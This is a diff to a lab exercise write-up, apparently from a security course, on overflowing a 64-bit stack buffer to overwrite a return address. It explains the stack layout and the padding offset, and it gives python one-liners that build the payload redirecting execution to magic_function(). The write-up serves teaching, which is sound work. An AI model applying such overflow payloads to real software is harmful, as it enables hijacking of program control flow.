@@ -15,11 +15,11 @@ parent: 'Task: Overwrite Return Address'
 - This function reads the length of a buffer from standard input into a variable `n`.
 - Then it reads the buffer itself (`char buffer[64]`).
 - Because `fgets()` reads at most `n - 1` characters, we can set `n` to a value bigger than the length of the buffer, so an overflow may be possible.
-- We will set `n` to a large enough value: `100`
+- We will set `n` to a large enough value: `120`
 
-- `magic_function()` starts at address `0x08048596`
-- From the first 4 lines from `read_buffer()` we get that: `ebp` and `edi` get pushed on the stack, then the stack is extended by `0x54` = `84`
-- So we must print `88 + 4 + 4 = 92` dummy characters `A` and then the address of `magic_function()` in little-endian encoding
+- `magic_function()` starts at address `0x401176`
+- From the first 3 lines from `read_buffer()` we get that: `rbp` gets pushed on the stack, then the stack is extended by `0x60` = `96`
+- So we must print `96 + 8 = 104` dummy characters `A` and then the address of `magic_function()` in little-endian encoding
 
 For further explanation:
 
@@ -30,8 +30,20 @@ char buffer[64] = "\0";                         // 64 bytes
 size_t i, len;                                  // 16 bytes (8 each one)
 ```
 
-Sum that up and add another 4 for `ebp` => 92
+However, keep in mind that the stack alignment is 16 bytes for `x64` systems, so the `buffer` variable along with the other four will be aligned to 16 bytes. This is how the variable placement looks like after the stack is aligned:
+
+```c
+char buffer[68];                // [rsp+0h] [rbp-60h] BYREF
+int n;                          // [rsp+44h] [rbp-1Ch] BYREF
+size_t len;                     // [rsp+48h] [rbp-18h]
+unsigned int disorienting_var;  // [rsp+54h] [rbp-Ch]
+size_t i;                       // [rsp+58h] [rbp-8h]
+```
+
+Also make sure to properly pack the address of `magic_function()` in little-endian format (8 bytes). (0x0000000000401176)
 
 ``` Bash
-python2.7 -c 'print "100\n" + "A" * 92 + "\x96\x85\x04\x08"' > payload
+python2.7 -c 'print "120\n" + "A" * 104 + "\x76\x11\x40\x00\x00\x00\x00\x00"' > payload
+# or
+python3 -c 'print("120\n" + "A" * 104 + "\x76\x11\x40\x00\x00\x00\x00\x00")' > payload
 ```
